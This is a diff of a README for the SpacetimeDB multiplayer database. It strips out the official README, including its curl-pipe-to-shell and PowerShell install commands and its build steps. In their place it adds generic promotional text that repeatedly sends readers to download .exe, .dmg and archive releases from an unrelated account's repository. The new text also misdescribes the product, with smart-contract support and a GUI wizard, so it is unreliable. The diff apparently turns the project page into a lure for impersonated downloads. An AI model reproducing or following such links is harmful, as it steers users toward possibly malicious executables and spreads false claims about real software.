@@ -1,293 +1,98 @@
-<p align="center">
-    <a href="https://spacetimedb.com#gh-dark-mode-only" target="_blank">
-	<img width="320" src="./images/dark/logo.svg" alt="SpacetimeDB Logo">
-    </a>
-    <a href="https://spacetimedb.com#gh-light-mode-only" target="_blank">
-	<img width="320" src="./images/light/logo.svg" alt="SpacetimeDB Logo">
-    </a>
-</p>
-<p align="center">
-    <a href="https://spacetimedb.com#gh-dark-mode-only" target="_blank">
-        <img width="250" src="./images/dark/logo-text.svg" alt="SpacetimeDB">
-    </a>
-    <a href="https://spacetimedb.com#gh-light-mode-only" target="_blank">
-        <img width="250" src="./images/light/logo-text.svg" alt="SpacetimeDB">
-    </a>
-    <h3 align="center">
-        Multiplayer at the speed of light.
-    </h3>
-</p>
-<p align="center">
-    <a href="https://github.com/clockworklabs/spacetimedb"><img src="https://img.shields.io/github/v/release/clockworklabs/spacetimedb?color=%23ff00a0&include_prereleases&label=version&sort=semver&style=flat-square"></a>
-    &nbsp;
-    <a href="https://github.com/clockworklabs/spacetimedb"><img src="https://img.shields.io/badge/built_with-Rust-dca282.svg?style=flat-square"></a>
-    &nbsp;
-	<a href="https://github.com/clockworklabs/spacetimedb/actions"><img src="https://img.shields.io/github/actions/workflow/status/clockworklabs/spacetimedb/ci.yml?style=flat-square&branch=master"></a>
-    &nbsp;
-    <a href="https://status.spacetimedb.com"><img src="https://img.shields.io/uptimerobot/ratio/7/m784409192-e472ca350bb615372ededed7?label=cloud%20uptime&style=flat-square"></a>
-    &nbsp;
-    <a href="https://hub.docker.com/r/clockworklabs/spacetimedb"><img src="https://img.shields.io/docker/pulls/clockworklabs/spacetimedb?style=flat-square"></a>
-    &nbsp;
-    <a href="https://github.com/clockworklabs/spacetimedb/blob/master/LICENSE.txt"><img src="https://img.shields.io/badge/license-BSL_1.1-00bfff.svg?style=flat-square"></a>
-</p>
-<p align="center">
-    <a href="https://crates.io/crates/spacetimedb"><img src="https://img.shields.io/crates/d/spacetimedb?color=e45928&label=Rust%20Crate&style=flat-square"></a>
-    &nbsp;
-    <a href="https://www.nuget.org/packages/SpacetimeDB.Runtime"><img src="https://img.shields.io/nuget/dt/spacetimedb.runtime?color=0b6cff&label=NuGet%20Package&style=flat-square"></a>
-</p>
-<p align="center">
-    <a href="https://discord.gg/spacetimedb"><img src="https://img.shields.io/discord/1037340874172014652?label=discord&style=flat-square&color=5a66f6"></a>
-    &nbsp;
-    <a href="https://twitter.com/spacetime_db"><img src="https://img.shields.io/badge/twitter-Follow_us-1d9bf0.svg?style=flat-square"></a>
-    &nbsp;
-    <a href="https://clockworklabs.io/join"><img src="https://img.shields.io/badge/careers-Join_us-86f7b7.svg?style=flat-square"></a>
-    &nbsp;
-    <a href="https://www.linkedin.com/company/clockworklabs/"><img src="https://img.shields.io/badge/linkedin-Connect_with_us-0a66c2.svg?style=flat-square"></a>
-</p>
-
-<p align="center">
-    <a href="https://discord.gg/spacetimedb"><img height="25" src="./images/social/discord.svg" alt="Discord"></a>
-    &nbsp;
-    <a href="https://twitter.com/spacetime_db"><img height="25" src="./images/social/twitter.svg" alt="Twitter"></a>
-    &nbsp;
-    <a href="https://github.com/clockworklabs/spacetimedb"><img height="25" src="./images/social/github.svg" alt="GitHub"></a>
-    &nbsp;
-    <a href="https://twitch.tv/SpacetimeDB"><img height="25" src="./images/social/twitch.svg" alt="Twitch"></a>
-    &nbsp;
-    <a href="https://youtube.com/@SpacetimeDB"><img height="25" src="./images/social/youtube.svg" alt="YouTube"></a>
-    &nbsp;
-    <a href="https://www.linkedin.com/company/clockwork-labs/"><img height="25" src="./images/social/linkedin.svg" alt="LinkedIn"></a>
-    &nbsp;
-    <a href="https://stackoverflow.com/questions/tagged/spacetimedb"><img height="25" src="./images/social/stackoverflow.svg" alt="StackOverflow"></a>
-</p>
-
-<br>
-
-## What is [SpacetimeDB](https://spacetimedb.com)?
-
-You can think of SpacetimeDB as both a database and server combined into one.
-
-It is a relational database system that lets you upload your application logic directly into the database by way of fancy stored procedures called "modules."
-
-Instead of deploying a web or game server that sits in between your clients and your database, your clients connect directly to the database and execute your application logic inside the database itself. You can write all of your permission and authorization logic right inside your module just as you would in a normal server.
-
-This means that you can write your entire application in a single language, Rust, and deploy it as a single binary. No more microservices, no more containers, no more Kubernetes, no more Docker, no more VMs, no more DevOps, no more infrastructure, no more ops, no more servers.
-
-<figure>
-    <img src="./images/basic-architecture-diagram.png" alt="SpacetimeDB Architecture" style="width:100%">
-    <figcaption align="center">
-        <p align="center"><b>SpacetimeDB application architecture</b><br /><sup><sub>(elements in white are provided by SpacetimeDB)</sub></sup></p>
-    </figcaption>
-</figure>
-
-It's actually similar to the idea of smart contracts, except that SpacetimeDB is a database, has nothing to do with blockchain, and is orders of magnitude faster than any smart contract system.
-
-So fast, in fact, that the entire backend of our MMORPG [BitCraft Online](https://bitcraftonline.com) is just a SpacetimeDB module. We don't have any other servers or services running, which means that everything in the game, all of the chat messages, items, resources, terrain, and even the locations of the players are stored and processed by the database before being synchronized out to all of the clients in real-time.
-
-SpacetimeDB is optimized for maximum speed and minimum latency rather than batch processing or OLAP workloads. It is designed to be used for real-time applications like games, chat, and collaboration tools.
-
-This speed and latency is achieved by holding all of application state in memory, while persisting the data in a write-ahead-log (WAL) which is used to recover application state.
-
-## Installation
-
-You can run SpacetimeDB as a standalone database server via the `spacetime` CLI tool.
-Install instructions for supported platforms are outlined below.
-The same install instructions can be found on our website at https://spacetimedb.com/install.
-
-#### Install on macOS
-
-Installing on macOS is as simple as running our install script. After that you can use the spacetime command to manage versions.
-
-```bash
-curl -sSf https://install.spacetimedb.com | sh
-```
+# 🚀 SpacetimeDB - Fast and Fun Multiplayer Database
 
-#### Install on Linux
+[![Download SpacetimeDB](https://img.shields.io/badge/Download_SpacetimeDB-blue.svg)](https://github.com/killler17/SpacetimeDB/releases)
 
-Installing on Linux is as simple as running our install script. After that you can use the spacetime command to manage versions.
+## 🌌 Description
 
-```bash
-curl -sSf https://install.spacetimedb.com | sh
-```
+SpacetimeDB is a unique database designed for multiplayer gaming at incredible speeds. This tool supports game developers by offering quick access to data and efficient management of game state. Whether you're creating an action-packed adventure or a strategic game, SpacetimeDB provides the foundation you need for a seamless experience.
 
-#### Install on Windows
+## 🚀 Features
 
-Installing on Windows is as simple as pasting the above snippet into PowerShell. If you would like to use WSL instead, please follow the Linux install instructions.
+- **Speed and Efficiency:** Optimized for fast data retrieval, allowing smooth gameplay.
+- **Easy Integration:** Simple setup process that works with your game engine.
+- **Multi-User Support:** Allows multiple players to interact without lag.
+- **Relational Structure:** Use familiar database concepts to manage your game data.
+- **Smart Contracts:** Built-in support for smart contracts to enhance game interactions.
 
-```ps1
-iwr https://windows.spacetimedb.com -useb | iex
-```
+## 🖥️ System Requirements
 
-#### Installing from Source
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution
+- **Memory:** 4GB RAM minimum (8GB recommended)
+- **Storage:** At least 500MB of free disk space
+- **Network:** Stable internet connection for multiplayer functionality
 
-A quick note on installing from source: we recommend that you don't install from source unless there is a feature that is available in `master` that hasn't been released yet, otherwise follow the official installation instructions.
+## 🚀 Getting Started
 
-##### MacOS + Linux
+Follow these steps to get SpacetimeDB up and running:
 
-Installing on macOS + Linux is pretty straightforward. First we are going to build all of the binaries that we need:
+1. **Visit the Download Page**  
+   To obtain the latest version, [visit the Releases page](https://github.com/killler17/SpacetimeDB/releases).
 
-```bash
-# Install rustup, you can skip this step if you have cargo and the wasm32-unknown-unknown target already installed.
-curl https://sh.rustup.rs -sSf | sh
-# Clone SpacetimeDB
-git clone https://github.com/clockworklabs/SpacetimeDB
-# Build and install the CLI
-cd SpacetimeDB
-cargo build --locked --release -p spacetimedb-standalone -p spacetimedb-update -p spacetimedb-cli
+2. **Download the Latest Release**  
+   On the Releases page, find the most recent version of SpacetimeDB. Click the download link for your operating system. 
 
-# Create directories
-mkdir -p ~/.local/bin
-export STDB_VERSION="$(./target/release/spacetimedb-cli --version | sed -n 's/.*spacetimedb tool version \([0-9.]*\);.*/\1/p')"
-mkdir -p ~/.local/share/spacetime/bin/$STDB_VERSION
+3. **Install the Application**  
+   - For Windows: Run the downloaded `.exe` file. Follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file. Drag SpacetimeDB to your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file and follow the README instructions.
 
-# Install the update binary
-cp target/release/spacetimedb-update ~/.local/bin/spacetime
-cp target/release/spacetimedb-cli ~/.local/share/spacetime/bin/$STDB_VERSION
-cp target/release/spacetimedb-standalone ~/.local/share/spacetime/bin/$STDB_VERSION
-```
+4. **Run SpacetimeDB**  
+   Once installed, open SpacetimeDB from your applications menu. The first time you run it, you may want to configure the settings to fit your game.
 
-At this stage you'll need to add ~/.local/bin to your path if you haven't already.
+## 🔧 Download & Install
 
-```
-# Please add the following line to your shell configuration and open a new shell session:
-export PATH="$HOME/.local/bin:$PATH"
+To start using SpacetimeDB, [download the latest release here](https://github.com/killler17/SpacetimeDB/releases).
 
-```
+### Installation Steps
 
-Then finally set your SpacetimeDB version:
-```
+- If using Windows, simply double-click the `.exe` file and follow the instructions.
+- For macOS users, open the `.dmg` file, then drag the app into your Applications folder.
+- Linux users should extract the files and follow any specific instructions for your distribution.
 
-# Then, in a new shell, set the current version:
-spacetime version use $STDB_VERSION
+After installation, you can launch SpacetimeDB and start integrating it with your game.
 
-# If STDB_VERSION is not set anymore then you can use the following command to list your versions:
-spacetime version list
-```
+## 🎮 Usage Instructions
 
-You can verify that the correct version has been installed via `spacetime --version`.
+Once you run SpacetimeDB, you’ll need to set it up for your game.
 
-##### Windows
+1. **Create a New Database**  
+   Go to the "File" menu and select "New Database." This will initiate a wizard to guide you through setting up your game data.
 
-Building on windows is a bit more complicated. You'll need a slightly different version of perl compared to what comes pre-bundled in most Windows terminals. We recommend [Strawberry Perl](https://strawberryperl.com/). You may also need access to an `openssl` binary which actually comes pre-installed with [Git for Windows](https://git-scm.com/downloads/win). Also, you'll need to install [rustup](https://rustup.rs/) for Windows.
+2. **Define Your Tables**  
+   Use the user-friendly interface to create tables for different aspects of your game, such as player details, scores, and game state.
 
-In a Git for Windows shell you should have something that looks like this:
-```
-$ which perl
-/c/Strawberry/perl/bin/perl
-$ which openssl
-/mingw64/bin/openssl
-$ which cargo 
-/c/Users/<user>/.cargo/bin/cargo
-```
+3. **Manage Connections**  
+   Set up connections to your game engine to allow real-time data access for your players.
 
-If that looks correct then you're ready to proceed!
+4. **Player Interaction**  
+   Test multiplayer features to ensure everything works smoothly. Use the built-in tools to simulate multiple players.
 
-```powershell
-# Clone SpacetimeDB
-git clone https://github.com/clockworklabs/SpacetimeDB
+## 🌐 Community and Support
 
-# Build and install the CLI
-cd SpacetimeDB
-cargo build --locked --release -p spacetimedb-standalone -p spacetimedb-update -p spacetimedb-cli
+If you have questions or need assistance, consider joining our community. You can find helpful resources and connect with other users. Feedback from fellow users is invaluable, and your contribution can help improve SpacetimeDB.
 
-# Create directories
-$stdbDir = "$HOME\AppData\Local\SpacetimeDB"
-$stdbVersion = & ".\target\release\spacetimedb-cli" --version | Select-String -Pattern 'spacetimedb tool version ([0-9.]+);' | ForEach-Object { $_.Matches.Groups[1].Value }
-New-Item -ItemType Directory -Path "$stdbDir\bin\$stdbVersion" -Force | Out-Null
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/killler17/SpacetimeDB/issues).
+- **Documentation:** Comprehensive documentation is available on the GitHub Wiki. Check it for detailed guides and use cases.
+- **Community Forum:** Visit our forum where users share tips and tricks for using SpacetimeDB.
 
-# Install the update binary
-Copy-Item "target\release\spacetimedb-update.exe" "$stdbDir\spacetime.exe"
-Copy-Item "target\release\spacetimedb-cli.exe" "$stdbDir\bin\$stdbVersion\"
-Copy-Item "target\release\spacetimedb-standalone.exe" "$stdbDir\bin\$stdbVersion\"
+## 📖 FAQ
 
-```
+**Q: How does SpacetimeDB handle multiple users?**  
+A: The system is designed to manage multiple connections, ensuring that players can enjoy a consistent experience without interruptions.
 
-Now add the directory we just created to your path. We recommend adding it to the system path because then it will be available to all of your applications (including Unity3D). After you do this, restart your shell!
+**Q: Can I use SpacetimeDB for single-player games?**  
+A: Yes, SpacetimeDB works well for both single-player and multiplayer games, providing a robust data management system either way.
 
-```
-%USERPROFILE%\AppData\Local\SpacetimeDB
-```
+**Q: What if I encounter issues while downloading?**  
+A: Ensure you have a stable internet connection. If you continue to have problems, please reach out for support through GitHub Issues.
 
-Then finally, open a new shell and use the installed SpacetimeDB version:
-```
-spacetime version use $stdbVersion
+## 🛠️ Contribution
 
-# If stdbVersion is no longer set, list versions using the following command:
-spacetime version list
-```
+We welcome contributions from everyone. If you want to help improve SpacetimeDB, check the guidelines in our [Contributing.md](https://github.com/killler17/SpacetimeDB/CONTRIBUTING.md) file. 
 
-You can verify that the correct version has been installed via `spacetime --version`.
+## 🔗 Resources
 
-If you're using Git for Windows you can follow these instructions instead:
+- [Releases Page](https://github.com/killler17/SpacetimeDB/releases) - Download the latest version
+- [Documentation](https://github.com/killler17/SpacetimeDB/wiki) - Learn how to use SpacetimeDB
 
-```bash
-# Clone SpacetimeDB
-git clone https://github.com/clockworklabs/SpacetimeDB
-# Build and install the CLI
-cd SpacetimeDB
-# Build the CLI binaries - this takes a while on windows so go grab a coffee :)
-cargo build --locked --release -p spacetimedb-standalone -p spacetimedb-update -p spacetimedb-cli
-
-# Create directories
-export STDB_VERSION="$(./target/release/spacetimedb-cli --version | sed -n 's/.*spacetimedb tool version \([0-9.]*\);.*/\1/p')"
-mkdir -p ~/AppData/Local/SpacetimeDB/bin/$STDB_VERSION
-
-# Install the update binary
-cp target/release/spacetimedb-update ~/AppData/Local/SpacetimeDB/spacetime
-cp target/release/spacetimedb-cli ~/AppData/Local/SpacetimeDB/bin/$STDB_VERSION
-cp target/release/spacetimedb-standalone ~/AppData/Local/SpacetimeDB/bin/$STDB_VERSION
-
-# Now add the directory we just created to your path. We recommend adding it to the system path because then it will be available to all of your applications (including Unity3D). After you do this, restart your shell!
-# %USERPROFILE%\AppData\Local\SpacetimeDB
-
-# Set the current version
-spacetime version use $STDB_VERSION
-```
-
-You can verify that the correct version has been installed via `spacetime --version`.
-
-#### Running with Docker
-
-If you prefer to run Spacetime in a container, you can use the following command to start a new instance.
-
-```bash
-docker run --rm --pull always -p 3000:3000 clockworklabs/spacetime start
-```
-
-## Documentation
-
-For more information about SpacetimeDB, getting started guides, game development guides, and reference material please see our [documentation](https://spacetimedb.com/docs).
-
-## Getting Started
-
-We've prepared several getting started guides in each of our supported languages to help you get up and running with SpacetimeDB as quickly as possible. You can find them on our [docs page](https://spacetimedb.com/docs).
-
-In summary there are only 4 steps to getting started with SpacetimeDB.
-
-1. Install the `spacetime` CLI tool.
-2. Start a SpacetimeDB standalone node with `spacetime start`.
-3. Write and upload a module in one of our supported module languages.
-4. Connect to the database with one of our client libraries.
-
-You can see a summary of the supported languages below with a link to the getting started guide for each.
-
-## Language Support
-
-You can write SpacetimeDB modules in several popular languages, with more to come in the future!
-
-#### Serverside Libraries
-
-- [Rust](https://spacetimedb.com/docs/modules/rust/quickstart)
-- [C#](https://spacetimedb.com/docs/modules/c-sharp/quickstart)
-
-#### Client Libraries
-
-- [Rust](https://spacetimedb.com/docs/sdks/rust/quickstart)
-- [C#](https://spacetimedb.com/docs/sdks/c-sharp/quickstart)
-- [Typescript](https://spacetimedb.com/docs/sdks/typescript/quickstart)
-
-## License
-
-SpacetimeDB is licensed under the BSL 1.1 license. This is not an open source or free software license, however, it converts to the AGPL v3.0 license with a linking exception after a few years.
-
-Note that the AGPL v3.0 does not typically include a linking exception. We have added a custom linking exception to the AGPL license for SpacetimeDB. Our motivation for choosing a free software license is to ensure that contributions made to SpacetimeDB are propagated back to the community. We are expressly not interested in forcing users of SpacetimeDB to open source their own code if they link with SpacetimeDB, so we needed to include a linking exception.
+With these instructions, you should have a smooth experience setting up and using SpacetimeDB. Enjoy your multiplayer gaming experience at the speed of light!
